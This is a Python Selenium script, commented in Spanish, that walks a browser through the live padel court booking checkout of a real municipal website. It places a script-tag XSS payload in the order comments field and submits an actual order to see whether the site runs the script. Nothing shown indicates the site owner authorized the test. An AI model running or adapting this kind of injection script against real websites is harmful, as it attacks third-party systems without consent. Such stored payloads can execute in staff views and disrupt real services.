from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Inicializa el navegador Chrome
driver = webdriver.Chrome()
wait = WebDriverWait(driver, 20)

print("Script de prueba XSS manual")
print("="*50)

try:
    print("Paso 1: Abriendo página de reserva...")
    driver.get("https://www.horcajodesantiago.es/reserva-pistas/pista-de-padel/")
    
    print("\nEn la ventana del navegador que se abrió:")
    print("1. Selecciona una fecha disponible en el calendario")
    print("2. Selecciona un horario disponible")
    print("3. Haz clic en 'Reservar ahora' o similar")
    print("4. Ve a finalizar compra")
    
    input("\nCuando hayas añadido algo al carrito, presiona Enter para continuar...")
    
    print("\nPaso 2: Navegando a finalizar compra...")
    driver.get("https://www.horcajodesantiago.es/reserva-pistas/carrito/finalizar-compra/")
    
    print("Paso 3: Esperando formulario de datos personales...")
    wait.until(EC.presence_of_element_located((By.NAME, "billing_first_name")))
    
    print("Paso 4: Rellenando formulario con payload XSS...")
    driver.find_element(By.NAME, "billing_first_name").send_keys("Prueba")
    driver.find_element(By.NAME, "billing_last_name").send_keys("XSS")
    driver.find_element(By.NAME, "billing_phone").send_keys("123456789")
    driver.find_element(By.NAME, "billing_email").send_keys("prueba@example.com")
    
    # Campo crítico para XSS
    campo_notas = driver.find_element(By.NAME, "order_comments")
    campo_notas.clear()
    campo_notas.send_keys("<script>alert('XSS Detectado!')</script>")
    
    print("✓ Formulario rellenado con payload XSS en el campo de notas")
    print("\nRevisa el formulario en el navegador.")
    
    # Marca términos si existe
    try:
        driver.find_element(By.NAME, "terms").click()
        print("✓ Términos y condiciones marcados")
    except:
        print("- No se encontró casilla de términos")
    
    input("\nPresiona Enter para enviar el formulario y probar XSS...")
    
    try:
        boton_enviar = driver.find_element(By.ID, "place_order")
        boton_enviar.click()
        print("✓ Formulario enviado")
        
        print("\nObservando resultados...")
        print("- Si aparece una alerta 'XSS Detectado!', la web ES VULNERABLE")
        print("- Si no aparece alerta, revisa si el texto aparece reflejado en la página")
        
        time.sleep(15)  # Tiempo para observar el resultado
        
    except Exception as e:
        print(f"Error al enviar formulario: {e}")
        print("Intenta enviar manualmente desde el navegador")
        
except Exception as e:
    print(f"Error: {e}")
    input("Presiona Enter para cerrar el navegador...")

print("\nCerrando navegador...")
driver.quit()
print("Prueba completada.")
